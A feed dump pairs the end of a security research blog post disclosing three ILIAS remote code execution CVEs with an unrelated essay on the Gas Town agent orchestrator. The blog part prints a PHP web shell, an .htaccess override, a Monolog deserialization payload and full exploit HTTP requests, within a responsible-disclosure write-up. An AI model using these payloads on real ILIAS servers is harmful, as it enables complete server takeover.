    &lt;p&gt;This rule rewrites any requests to &lt;code&gt;/data/.*/.*/.*&lt;/code&gt; so they are handled by &lt;code&gt;wac.php&lt;/code&gt;, which in turn calls &lt;code&gt;ilWebAccessCheckerDelivery::run()&lt;/code&gt; to perform access control checks. If access is permitted, the file is served with headers like &lt;code&gt;Content-Disposition: attachment&lt;/code&gt; or &lt;code&gt;inline&lt;/code&gt; to ensure itâs treated as a download and hasnât become executable. This is an intentional safeguard to prevent arbitrary code execution, even if a &lt;code&gt;.php&lt;/code&gt; file somehow makes its way into a subdirectory of &lt;code&gt;/data/&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;Change .htaccess directives&lt;/head&gt;
    &lt;p&gt;Take note of the &lt;code&gt;[L]&lt;/code&gt; flag in the &lt;code&gt;.htaccess&lt;/code&gt; definition. It is a common misconception that this flag would prevent any further rewriting altogether. In fact, &lt;code&gt;[L]&lt;/code&gt; only stops that set of rewrite rules from continuing. This is a crucial detail, as it does not prevent Apache from continuing the directory walk or parsing other &lt;code&gt;.htaccess&lt;/code&gt; files in subdirectories.&lt;/p&gt;
    &lt;p&gt;This enables us to define more hacker-friendly directives wherever we can create &lt;code&gt;.htaccess&lt;/code&gt; files. So we include our own &lt;code&gt;.htaccess&lt;/code&gt; file inside the zip file and give the web server a simple new directive:&lt;/p&gt;
    &lt;code&gt;&amp;lt;IfModule mod_rewrite.c&amp;gt;
    RewriteEngine On  
    RewriteRule ^$ . [L]  
    AddType application/x-httpd-php .sec
&amp;lt;/IfModule&amp;gt;&lt;/code&gt;
    &lt;p&gt;Once the ZIP is extracted, this &lt;code&gt;.htaccess&lt;/code&gt; file lands inside the same subfolder in &lt;code&gt;/data/&lt;/code&gt; as our PHP payload. Apache now encounters and respects multiple &lt;code&gt;.htaccess&lt;/code&gt; files: The first one at the DocumentRoot and our new one inside the extracted directory. Our new specific directives for this subdirectory overrule those specified in the parent folders.&lt;/p&gt;
    &lt;p&gt;Enabling &lt;code&gt;RewriteEngine&lt;/code&gt; "disables" the original rewrite rule, preventing Apache from routing requests through &lt;code&gt;wac.php&lt;/code&gt;. We then instruct the web server to treat &lt;code&gt;.sec&lt;/code&gt; files as PHP executables using the directive: &lt;code&gt;AddType application/x-httpd-php .sec&lt;/code&gt;. As a result, a &lt;code&gt;.sec&lt;/code&gt; file is now interpreted and executed by the server as a PHP file.&lt;/p&gt;
    &lt;quote&gt;&lt;p&gt;Why is the .sec extension necessary at all?&lt;/p&gt;&lt;lb/&gt;In an ILIAS basic installation the custom file extension might not be necessary. However, if operators apply recommended security hardening, Apache configurations following security advisories may deny direct access to&lt;code&gt;.php&lt;/code&gt;files located in&lt;code&gt;/data/*&lt;/code&gt;at host-level configuration. By using a custom extension, we preemptively circumvent such a restriction.&lt;/quote&gt;
    &lt;p&gt;We have now bypassed the global rewrite protections and enabled full code execution by adding a custom &lt;code&gt;.htaccess&lt;/code&gt; file to the ZIP file, and thus the extraction subfolder insider &lt;code&gt;/data/&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;We upload a ZIP archive containing a folder named &lt;code&gt;rce&lt;/code&gt; with the following files:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;a.sec&lt;/code&gt;: a simple PHP web shell (&lt;code&gt;&amp;lt;?php system($_GET['c']); ?&amp;gt;&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;.htaccess&lt;/code&gt;: the overriding configuration described above&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Once uploaded, we need to locate the exact path the ZIP contents were extracted to. ILIAS dynamically generates custom paths during the course certificate import process. In our case, the resulting paths follow this pattern:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;/data/[client_id]/assessment/certificates/[upload_id]/[timestamp]__0__[object_type]__[upload_id]__certificate/rce/a.sec&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;Despite the pathâs dynamic nature, we are able to reconstruct it, as all components are either deterministic, accessible by the client or easily guessable. Hereâs how we obtain each component:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;client_id&lt;/code&gt;can be found in the&lt;code&gt;ilClientId&lt;/code&gt;cookie set by ILIAS during session initialization.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;upload_id&lt;/code&gt;would be exposed to authenticated in users in a JavaScript. However, this is not the case for unauthenticated users, so we need to find a workaround. Looking at the execution flow we notice that any method in the related class can be invoked directly. Conveniently, thereâs a method named certificateExportFO(). By setting its name as the value of the&lt;code&gt;cmd&lt;/code&gt;URL parameter we can directly invoke it and trigger a 302 redirect initiating a file download. The filename in the&lt;code&gt;Content-Disposition&lt;/code&gt;header includes&lt;code&gt;upload_id&lt;/code&gt;, which we extract using the following regular expression:&lt;code&gt;__([a-zA-Z0-9]{3})__(\d+)__&lt;/code&gt;. This allows us to recover the necessary ID for any publicly accessible and vulnerable object type.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;timestamp&lt;/code&gt;is generated using PHPâs&lt;code&gt;time()&lt;/code&gt;function at the moment the foldername is generated right after upload. Because this happens just milliseconds after the upload request, we can identify the value by iterating through a small time window.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;object_type&lt;/code&gt;is a short identifier representing the ILIAS object type, determined using the&lt;code&gt;ref_id&lt;/code&gt;in the URL. In our case, the object is&lt;code&gt;TestObject&lt;/code&gt;, so the type is&lt;code&gt;tst&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Putting it all together, the final path may look like this:&lt;code&gt;/data/myilias/assessment/certificates/415/1753256753__0__tst__415__certificate/rce/a.sec&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;A GET request to that URL with a &lt;code&gt;?c=&amp;lt;CLI_COMMAND&amp;gt;&lt;/code&gt; query parameter confirms successful remote code execution, returning the commandâs output.&lt;/p&gt;
    &lt;head rend="h3"&gt;CVE-2025-11344 - PoC Exploit&lt;/head&gt;
    &lt;p&gt;Summing up, this RCE vulnerability is results from a combination of overlooked security issues:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Inadequate access control checks in the class chain leading to course certificate-related actions&lt;/item&gt;
      &lt;item&gt;Uncaught exceptions on ZIP and XML parsing logic prevent cleanup of extracted files&lt;/item&gt;
      &lt;item&gt;Insufficient checks on the extracted zip contents allow us to place an &lt;code&gt;.htaccess&lt;/code&gt;file&lt;/item&gt;
      &lt;item&gt;.htaccess inheritance allows us to override directives for subfolders&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Impact: Complete server compromise with no authentication required if one of the two object types âTestâ or âCourseâ is exposed in a public area.&lt;/p&gt;
    &lt;head rend="h1"&gt;2. Authenticated RCE (CVE-2025-11345)&lt;/head&gt;
    &lt;p&gt;File uploads during import in ILIAS are handled by several adapters defined for different import models in class.ilImport.php. The adapter first extracts the uploaded ZIP file and processes the accompanying XML. During this process, importXmlRepresentation reads the extracted XML, which is then passed into &lt;code&gt;importRandomQuestionSetConfig&lt;/code&gt; and reaches an &lt;code&gt;unserialize()&lt;/code&gt; call in class.ilObjTestXMLParser.&lt;/p&gt;
    &lt;p&gt;Insecure deserialization. The use of &lt;code&gt;unserialize()&lt;/code&gt; alone does not inherently result in RCE. However, passing attacker-controlled input to this function without restricting &lt;code&gt;allowed_classes&lt;/code&gt; via the &lt;code&gt;options&lt;/code&gt; parameter often enables undesired behavior. The PHP documentation also highlights that object instantiation and autoloading in such scenarios can lead to code execution.&lt;/p&gt;
    &lt;p&gt;Magic functions. &lt;code&gt;unserialize()&lt;/code&gt; becomes a problem when so-called magic functions are available, which override PHP default behavior for certain actions on the object especially around its lifecycle (creation, destruction but also serialization and deserialization). If the application contains any class definition that contains a magic function that executes code based on attacker-controllable class fields, we can achieve RCE.&lt;/p&gt;
    &lt;p&gt;Composer-based PHP applications frequently include third-party packages that contain such classes with exploitable magic methods simply due to a large dependency footprint. To assess this risk in ILIAS, we examine all dependencies and stumble across the inclusion of &lt;code&gt;Monolog&lt;/code&gt;, a commonly used logging library.&lt;/p&gt;
    &lt;p&gt;We construct a Monolog-specific payload using PHARGGC, a tool specialized in constructing gadget chains for PHP &lt;code&gt;unserialize()&lt;/code&gt;. The payload leverages a combination of &lt;code&gt;FingersCrossedHandler&lt;/code&gt; and &lt;code&gt;GroupHandler&lt;/code&gt; to achieve code execution. For demonstration purposes, the payload below executes the following command:
&lt;code&gt;echo 'SRLabs was here' &amp;gt; /tmp/__PWNED__&lt;/code&gt;&lt;/p&gt;
    &lt;p&gt;To ensure reliable execution, we hex-encode the fields in order to replace raw &lt;code&gt;\0&lt;/code&gt; characters that would otherwise disrupt parsing. The final payload is:&lt;/p&gt;
    &lt;code&gt;O:37:"Monolog\Handler\FingersCrossedHandler":3:{S:16:"\00\2a\00\70\61\73\73\74\68\72\75\4c\65\76\65\6c";i:0;S:9:"\00\2a\00\62\75\66\66\65\72";a:1:{S:4:"\74\65\73\74";a:2:{i:0;S:39:"\65\63\68\6f\20\27\53\52\4c\61\62\73\20\77\61\73\20\68\65\72\65\27\20\3e\20\2f\74\6d\70\2f\5f\5f\50\57\4e\45\44\5f\5f";S:5:"\6c\65\76\65\6c";N;}}S:10:"\00\2a\00\68\61\6e\64\6c\65\72";O:28:"Monolog\Handler\GroupHandler":1:{S:13:"\00\2a\00\70\72\6f\63\65\73\73\6f\72\73";a:2:{i:0;S:7:"\63\75\72\72\65\6e\74";i:1;S:6:"\73\79\73\74\65\6d";}}}&lt;/code&gt;
    &lt;p&gt;We embed the payload in the following XML structure to trigger the &lt;code&gt;unserialize&lt;/code&gt; call for the &lt;code&gt;taxFilter&lt;/code&gt; field of &lt;code&gt;RandomQuestionSelectionDefinition&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;&amp;lt;?xml version="1.0" encoding="utf-8"?&amp;gt;
&amp;lt;!DOCTYPE Test SYSTEM "http://www.ilias.uni-koeln.de/download/dtd/ilias_co.dtd"&amp;gt;
&amp;lt;!--Export of ILIAS Test 326 of installation 0--&amp;gt;
&amp;lt;ContentObject Type="Test"&amp;gt;
&amp;lt;RandomQuestionSetConfig&amp;gt;
  &amp;lt;RandomQuestionStage&amp;gt;&amp;lt;/RandomQuestionStage&amp;gt;
  &amp;lt;RandomQuestionSelectionDefinitions&amp;gt;
    &amp;lt;RandomQuestionSelectionDefinition poolId="320" amountMode="" poolQuestCount="1" questAmount="1" position="0" taxFilter='O:37:"Monolog\Handler\FingersCrossedHandler":3:{S:16:"\00\2a\00\70\61\73\73\74\68\72\75\4c\65\76\65\6c";i:0;S:9:"\00\2a\00\62\75\66\66\65\72";a:1:{S:4:"\74\65\73\74";a:2:{i:0;S:39:"\65\63\68\6f\20\27\53\52\4c\61\62\73\20\77\61\73\20\68\65\72\65\27\20\3e\20\2f\74\6d\70\2f\5f\5f\50\57\4e\45\44\5f\5f";S:5:"\6c\65\76\65\6c";N;}}S:10:"\00\2a\00\68\61\6e\64\6c\65\72";O:28:"Monolog\Handler\GroupHandler":1:{S:13:"\00\2a\00\70\72\6f\63\65\73\73\6f\72\73";a:2:{i:0;S:7:"\63\75\72\72\65\6e\74";i:1;S:6:"\73\79\73\74\65\6d";}}}' homogeneous="" synctimestamp=""/&amp;gt;
    &amp;lt;/RandomQuestionSelectionDefinitions&amp;gt;
  &amp;lt;/RandomQuestionSetConfig&amp;gt;
&amp;lt;/ContentObject&amp;gt;&lt;/code&gt;
    &lt;p&gt;When the payload is embedded in a valid ILIAS import archive, uploading it through the import endpoint results in RCE. The request below illustrates the process:&lt;/p&gt;
    &lt;code&gt;POST /ilias.php?baseClass=importuploadhandlergui&amp;amp;cmd=upload HTTP/1.1
Host: lab1.local
X-Requested-With: XMLHttpRequest
Accept: application/json
Content-Type: multipart/form-data; boundary=----ABC
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Origin: http://lab1.local
Referer: http://lab1.local/ilias.php?baseClass=ilrepositorygui&amp;amp;cmdNode=wr:pp&amp;amp;cmdClass=ilObjRootFolderGUI&amp;amp;cmd=render&amp;amp;ref_id=1
Accept-Encoding: gzip, deflate, br
Cookie: ilClientId=myilias; PHPSESSID=8tjnfk65opmcrpkgqfijqfrg2i;
Connection: keep-alive

------ABC
Content-Disposition: form-data; name="file"; filename="1757316449__0__tst_326.zip"
Content-Type: application/zip
&amp;lt;ZIP_FILE_TO_UPLOAD&amp;gt;

------ABC--&lt;/code&gt;
    &lt;p&gt;Impact: Complete server compromise for authenticated users with permission to use the described import functionality â typically course administrators or similar roles.&lt;/p&gt;
    &lt;head rend="h1"&gt;3. Authenticated RCE (CVE-2025-11346)&lt;/head&gt;
    &lt;p&gt;A third RCE related to insecure deserialization affects the &lt;code&gt;f_settings&lt;/code&gt; URL parameter. This is especially interesting as we do not need to prepare any file input. We can simply pass our command as part of the request. Exploitation works in a similar way as above, but the serialized string can be directly encoded in Base64 without the need to wrap it in XML:&lt;/p&gt;
    &lt;code&gt;POST /ilias.php?baseClass=ilrepositorygui&amp;amp;cmdNode=wr:qx:1l&amp;amp;cmdClass=ilias\test\settings\scorereporting\settingsscoringgui&amp;amp;cmd=cancelSaveForm&amp;amp;ref_id=102&amp;amp;ref_id=104 HTTP/1.1
Host: lab1.local
Cookie: ilClientId=myilias; PHPSESSID=8tjnfk65opmcrpkgqfijqfrg2i
Content-Type: application/x-www-form-urlencoded

f_settings=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6Mzp7UzoxNjoiXDAwXDJhXDAwXDcwXDYxXDczXDczXDc0XDY4XDcyXDc1XDRjXDY1XDc2XDY1XDZjIjtpOjA7Uzo5OiJcMDBcMmFcMDBcNjJcNzVcNjZcNjZcNjVcNzIiO2E6MTp7Uzo0OiJcNzRcNjVcNzNcNzQiO2E6Mjp7aTowO1M6Mzk6Ilw2NVw2M1w2OFw2ZlwyMFwyN1w1M1w1Mlw0Y1w2MVw2Mlw3M1wyMFw3N1w2MVw3M1wyMFw2OFw2NVw3Mlw2NVwyN1wyMFwzZVwyMFwyZlw3NFw2ZFw3MFwyZlw1Zlw1Zlw1MFw1N1w0ZVw0NVw0NFw1Zlw1ZiI7Uzo1OiJcNmNcNjVcNzZcNjVcNmMiO047fX1TOjEwOiJcMDBcMmFcMDBcNjhcNjFcNmVcNjRcNmNcNjVcNzIiO086Mjg6Ik1vbm9sb2dcSGFuZGxlclxHcm91cEhhbmRsZXIiOjE6e1M6MTM6IlwwMFwyYVwwMFw3MFw3Mlw2Zlw2M1w2NVw3M1w3M1w2Zlw3Mlw3MyI7YToyOntpOjA7Uzo3OiJcNjNcNzVcNzJcNzJcNjVcNmVcNzQiO2k6MTtTOjY6Ilw3M1w3OVw3M1w3NFw2NVw2ZCI7fX19&lt;/code&gt;
    &lt;p&gt;Supplied input is passed directly to the getRelayedRequest() method, where it is Base64-decoded and then deserialized:&lt;/p&gt;
    &lt;code&gt;private function getRelayedRequest(): Request
{
    return unserialize(
        base64_decode(
            $this-&amp;gt;request-&amp;gt;getParsedBody()[self::F_CONFIRM_SETTINGS]
        )
    );
}&lt;/code&gt;
    &lt;p&gt;This simple flow enables direct execution of attacker-controlled payloads, resulting in RCE for authenticated users.&lt;/p&gt;
    &lt;p&gt;Impact: Complete server compromise for authenticated users with permission to call &lt;code&gt;ScoreReportingGUI&lt;/code&gt; endpoints that take the &lt;code&gt;f_settings&lt;/code&gt; parameter.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;ILIAS is a versatile and correspondingly complex platform. With about 1.2 million lines of PHP code, decades of features, and a broad plugin ecosystem, itâs no surprise that subtle edge cases can lead to serious security vulnerabilities.&lt;/p&gt;
    &lt;p&gt;None of this makes ILIAS a âbad choiceâ for eLearning per se. Itâs open source, widely deployed, and backed by an active community. Nonetheless, operators need to treat ILIAS like any other critical application and apply security updates promptly: Track advisories, patch within standard change windows and prepare an expedited path for RCEs, keep extensions lean and current, and avoid falling behind for multiple minor versions.&lt;/p&gt;
    &lt;p&gt;Security Research Labs engages in a broad range of offensive and defensive IT security consulting such as red teaming, code audits and strategic security assessments. If this kind of work excites you, we are hiring!&lt;/p&gt;
    &lt;p&gt;This blog post is the second part of a two-part series on security vulnerabilities in ILIAS:&lt;/p&gt;
    &lt;head rend="h2"&gt;Responsible Disclosure&lt;/head&gt;
    &lt;p&gt;As per standard practice, we disclosed all identified vulnerabilities to the vendor before publishing this blog post. The full disclosure timeline is provided below.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;2025-07-24: Discovered RCE #1 and #2&lt;/item&gt;
      &lt;item&gt;2025-08-25: Discovered RCE #3. Creating PoC and writeup&lt;/item&gt;
      &lt;item&gt;2025-09-03: Requested CVE IDs&lt;/item&gt;
      &lt;item&gt;2025-09-08: Notified vendor&lt;/item&gt;
      &lt;item&gt;2025-09-15: Vendor verified vulnerabilities&lt;/item&gt;
      &lt;item&gt;2025-09-23: Initial patches releases (8.24, 9.14, 10.2)&lt;/item&gt;
      &lt;item&gt;2025-09-25: Unauth RCE Fix bypass discovered&lt;/item&gt;
      &lt;item&gt;2025-09-26: Vendor notified&lt;/item&gt;
      &lt;item&gt;2025-08-29: CVE ID requested for unauthenticated RCE vulnerability bypass.&lt;/item&gt;
      &lt;item&gt;2025-09-06: CVE IDs assigned (CVE-2025-11344, CVE-2025-11345, CVE-2025-11346)&lt;/item&gt;
      &lt;item&gt;2025-09-07: Requested a CNA score update because the current CVSS 5.1 for CVE-2025-11344 is incorrect and understates the impact of an unauthenticated RCE vulnerability *&lt;/item&gt;
      &lt;item&gt;2025-09-23: Patches released (8.25, 9.15, 10.3)&lt;/item&gt;
      &lt;item&gt;2026-01-23: Publication of this blog post and CVE IDs&lt;/item&gt;
      &lt;item&gt;2026-01-23: Request for update published CVE on MITRE&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;* We also contacted the vendor regarding the CVSS rating, which appears to have been assigned arbitrarily without a transparent scoring matrix or justification. Unfortunately, we did not receive a response. This lack of transparency creates a significant issue for software operators, as the true severity of the vulnerability cannot be reliably assessed based on the CVE entry. As a result, there is a risk that affected systems were not updated in a timely manner due to the misleadingly low severity rating.&lt;/p&gt;
    &lt;head rend="h2"&gt;Advisories and release notes&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v10.2&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v10.3&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v9.14&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v9.15&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v8.24&lt;/item&gt;
      &lt;item&gt;https://github.com/ILIAS-eLearning/ILIAS/releases/tag/v8.25&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Researchers involved&lt;/head&gt;
    &lt;p&gt;Daniel KÃ¶hler, Florian Wilkens, Rachna Shriwas, Rene Rehme, Mahmoud Anas Khalifa&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46733899</guid><pubDate>Fri, 23 Jan 2026 15:48:54 +0000</pubDate></item><item><title>Gas Town's Agent Patterns, Design Bottlenecks, and Vibecoding at Scale</title><link>https://maggieappleton.com/gastown</link><description>&lt;doc fingerprint="3714585349c384a7"&gt;
  &lt;main&gt;
    &lt;head rend="h4"&gt;Table of Contents&lt;/head&gt;
    &lt;head rend="h4"&gt;Table of Contents&lt;/head&gt;
    &lt;p&gt;A few weeks ago Steve Yegge published an elaborate manifesto and guide to Gas Town, his Mad-Max-Slow-Horses-Waterworld-etc-themed agent orchestrator that runs dozens of coding agents simultaneously in a metaphorical town of automated activity. Gas Town is entirely vibecoded, hastily designed with off-the-cuff solutions, and inefficiently burning through thousands of dollars a month in API costs.&lt;/p&gt;
    &lt;p&gt;This doesn’t sound promising, but it’s lit divisive debates and sparks of change across the software engineering community. A small hype machine has formed around it. It’s made the rounds through every engineering team’s Slack, probably twice. There’s somehow already a $GAS meme coin doing over $400k in earnings. This was not Yegge’s doing – someone else set it up on the crypto platform Bags which ties tokens to individual creators. The coin holds no legitimate relationship to Gas Town’s success or failure so this is the purest of pure speculative betting. I expect nothing less from the crypto bros. And the hype is justified. First, because it’s utterly unhinged, and second because it’s a serious indication of how agents will change the nature of software development from this point on.&lt;/p&gt;
    &lt;p&gt;You should at least skim through Yegge’s original article before continuing to read my reflections. First, because I’m not going to comprehensively summarise it. A challenging task given the sprawling, haphazard nature of the piece And second, because a even a one minute glance over Yegge’s style of writing will make the vibes clear.&lt;/p&gt;
    &lt;p&gt;We should take Yegge’s creation seriously not because it’s a serious, working tool for today’s developers (it isn’t). But because it’s a good piece of speculative design fiction that asks provocative questions and reveals the shape of constraints we’ll face as agentic coding systems mature and grow.&lt;/p&gt;
    &lt;p&gt;“Design fiction” or “speculative design” is a branch of design where you creating things (objects, prototypes, sketches) from a plausible near future. Not to predict what’s going to happen, but to provoke questions and start conversations about what could happen. Not in a bright-and-glorious-flying-cars way that futurism can sometimes fall into. But, most helpfully, in a way that thinks about banal details, overlooked everyday interactions, low status objects, imperfect implementations, knock-on effects, and inconveniences. See the Near Future Lab’s short explainer video and their Manual of Design Fiction if you want to learn more.&lt;/p&gt;
    &lt;p&gt;I also think Yegge deserves praise for exercising agency and taking a swing at a system like this, despite the inefficiencies and chaos of this iteration. And then running a public tour of his shitty, quarter-built plane while it’s mid-flight.&lt;/p&gt;
    &lt;p&gt;When I was taken to the Tate Modern as a child I’d point at Mark Rothko pieces and say to my mother “I could do that”, and she would say “yes, but you didn’t.” Many people have talked about what large-scale, automated agent orchestration systems could look like in a few years, and no one else attempted to sincerely build it.&lt;/p&gt;
    &lt;p&gt;I should be transparent and say that I have not used Gas Town in earnest on any serious work. I have only lightly poked at it, because I do not qualify as a serious user when I’m still hovering around stages 4-6 in Yegge’s 8 levels of automation:&lt;/p&gt;
    &lt;p&gt;I currently juggle a handful of consecutive Claude Code and OpenCode agents, but pay close attention to the diffs and regularly check code in an IDE. Which I guess puts me in the agentically conservative camp in this distressingly breakneck moment in history.&lt;/p&gt;
    &lt;p&gt;Gas Town is a full-on stage 8 piece of tooling: using an orchestrator that manages dozens+ of other coding agents for you. Yegge also warned me not to seriously use Gas Town multiple times, in increasingly threatening typography. I trust his guidance on his own slush pile.&lt;/p&gt;
    &lt;p&gt;But I have grokked the basic concepts and spent more time with this manifesto than is warranted. And here is what stood out to me from the parts I could comprehend:&lt;/p&gt;
    &lt;head rend="h2"&gt;1. Design and planning becomes the bottleneck when agents write all the code&lt;/head&gt;
    &lt;p&gt;When you have a fat stack of agents churning through code tasks, development time is no longer the bottleneck. Yegge says “Gas Town churns through implementation plans so quickly that you have to do a LOT of design and planning to keep the engine fed.” Design becomes the limiting factor: imagining what you want to create and then figuring out all the gnarly little details required to make your imagination into reality.&lt;/p&gt;
    &lt;p&gt;I certainly feel this friction in both my own professional work and personal projects. My development velocity is far slower than Yegge since I only wrangle a few agents at a time and keep my eyes and hands on the code. But the build time is rarely what holds me up. It is always the design; how should we architect this? What should this feel like? How should this look? Is that transition subtle enough? How composable should this be? Is this the right metaphor?&lt;/p&gt;
    &lt;p&gt;When it’s not the design, it’s the product strategy and planning; What are the highest priority features to tackle? Which piece of this should we build first? When do we need to make that decision? What’s the next logical, incremental step we need to make progress here?&lt;/p&gt;
    &lt;p&gt;These are the kind of decisions that agents cannot make for you. They require your human context, taste, preferences, and vision.&lt;/p&gt;
    &lt;p&gt;With agents to hand, it’s easy to get ahead of yourself, stumbling forward into stacks of generated functions that should never have been prompted into existence, because they do not correctly render your intentions or achieve your goals.&lt;/p&gt;
    &lt;p&gt;Gas Town seems to be halfway into this pitfall. The biggest flaw in Yegge’s creation is that it is poorly designed. I mean this in the sense that he absolutely did not design the shape of this system ahead of time, thoughtfully considering which metaphors and primitives would make this effective, efficient, easy to use, and comprehensible.&lt;/p&gt;
    &lt;p&gt;He just made stuff up as he went. He says as much himself: “Gas Town is complicated. Not because I wanted it to be, but because I had to keep adding components until it was a self-sustaining machine.” Gas Town is composed of “especially difficult [theories] because it’s a bunch of bullshit I pulled out of my arse over the past 3 weeks, and I named it after badgers and stuff.” It was slapdashed together over “17 days, 75k lines of code, 2000 commits. It finally got off the ground (GUPP started working) just 2 days ago.” Do not ask what GUPP is; I cannot concisely explain without getting deep into it. Which we’ll do in a minute.&lt;/p&gt;
    &lt;p&gt;This Hacker News comment from qcnguy describes the problem well, and points out that Yegge’s previous Beads project, of which Gas Town is an extension, suffers the same issue:&lt;/p&gt;
    &lt;p&gt;“Beads is a good idea with a bad implementation. It’s not a designed product in the sense we are used to, it’s more like a stream of consciousness converted directly into code. It’s a program that isn’t only vibe coded, it was vibe designed too.”&lt;/p&gt;
    &lt;p&gt;“Gas Town is clearly the same thing multiplied by ten thousand. The number of overlapping and ad hoc concepts in this design is overwhelming. Steve is ahead of his time but we aren’t going to end up using this stuff. Instead a few of the core insights will get incorporated into other agents in a simpler but no less effective way.”&lt;/p&gt;
    &lt;p&gt;Or this review from astrra.space on Bluesky:&lt;/p&gt;
    &lt;p&gt;“gas town [is] such a nightmare to use i love it… the mayor is dumb as rocks the witness regularly forgets to look at stuff the deacon makes his own rules the crew have the object permanence of a tank full of goldfish and the polecats seem intent on wreaking as much chaos on the project as they can. this is peak entertainment i swear”&lt;/p&gt;
    &lt;p&gt;Friends and colleagues of mine who have been brave enough to try out Gas Town in more depth report the same thing; this thing fits the shape of Yegge’s brain and no one else’s. I’d categorise that as a moderate design fail, given this is a public product that I assume Yegge wants at least some people to try out. The onboarding is baptism by fire.&lt;/p&gt;
    &lt;p&gt;This feels like one of the most critical, emerging footguns of liberally hands-off agentic development. You can move so fast you never stop to think. It is so easy to prompt, you don’t fully consider what you’re building at each step of the process. It is only once you are hip-deep in poor architectural decisions, inscrutable bugs, and a fuzzy memory of what you set out to do, do you realise you have burned a billion tokens in exchange for a pile of hot trash.&lt;/p&gt;
    &lt;head rend="h2"&gt;2. Buried in the chaos are sketches of future agent orchestration patterns&lt;/head&gt;
    &lt;p&gt;Now that I’ve just critiqued the design of Gas Town, I will turn around and say that while the current amalgamation of polecats, convoys, deacons, molecules, protomolecules, mayors, seances, hooks, beads, witnesses, wisps, rigs, refineries, and dogs is a bunch of under cooked spaghetti, Yegge’s patterns roughly sketch out some useful conceptual shapes for future agentic systems.&lt;/p&gt;
    &lt;p&gt;If you step back and squint, this mishmash of concepts reveals a few underlying patterns that future agentic systems will likely follow:&lt;/p&gt;
    &lt;head rend="h3"&gt;Agents have specialised roles with hierarchical supervision&lt;/head&gt;
    &lt;p&gt;Every agent in Gas Town has a permanent, specialised role. When an agent spins up a new session, it knows who it is and what job it needs to do. Some examples:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The Mayor is the human concierge: it’s the main agent you talk to. It talks to all the other agents for you, kicking off work, receiving notifications when things finish, and managing the flow of production.&lt;/item&gt;
      &lt;item&gt;Polecats are temporary grunt workers. They complete single, isolated tasks, then disappear after submitting their work to be merged.&lt;/item&gt;
      &lt;item&gt;The Witness supervises the Polecats and helps them get unstuck. Its job is to solve problems and nudge the proletariat workers along.&lt;/item&gt;
      &lt;item&gt;The Refinery manages the merge queue into the main branch. It evaluates each piece of work waiting to be merged, resolving conflicts in the process. It can creatively “re-imagine” implementations if merge conflicts get too hairy, while trying to keep the intent of the original work.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;There are many more characters in this town, but these give you a flavour of the system. Giving each agent a single job means you can prompt them more precisely, limit what they’re allowed to touch, and run lots of them at once without them stepping on each other’s toes.&lt;/p&gt;
    &lt;p&gt;There’s also a clear chain of command between these agents. You talk to the Mayor, who coordinates work across the system. The Mayor in Gas Town never writes code. It talks to you, then creates work tasks and assigns them to workers. A set of system supervisors called the Witness, the Deacon, and “Boot the Dog” intermittently nudge the grunt workers and each other to check everyone is doing their work. Oh and there’s also a crew of “dogs” who do maintenance and cleaning.&lt;/p&gt;
    &lt;p&gt;It’s easier if I try and show you. Here’s the basic relationship structure of Gas Town, as best I can make out:&lt;/p&gt;
    &lt;p&gt;Since I’m making my own visuals here, I should justify it by pointing out that while Yegge made lots of his own ornate, zoopmorphic diagrams of Gas Town’s architecture and workflows, they are unhelpful. Primarily because they were made entirely by Gemini’s Nano Banana . And while Nano Banana is state-of-the-art at making diagrams, generative AI systems are still really shit at making illustrative diagrams. They are very hard to decipher, filled with cluttered details, have arrows pointing the wrong direction, and are often missing key information. Case in point:&lt;/p&gt;
    &lt;p&gt;Does this help you understand how the system works? No? No.&lt;/p&gt;
    &lt;p&gt;Gas Town’s hierarchical approach solves both a coordination and attention problem. Without it, you are the one assigning tasks to dozens individual agents, checking who’s stuck, who’s idle, and who’s waiting on work from someone else. With the Mayor as your single interface, that overhead disappears. You can continuously talk to the Mayor without interrupting any agents or getting in the way, or having to think much about which one is doing what. This is less cognitive overhead than constantly switching tabs between Claudes.&lt;/p&gt;
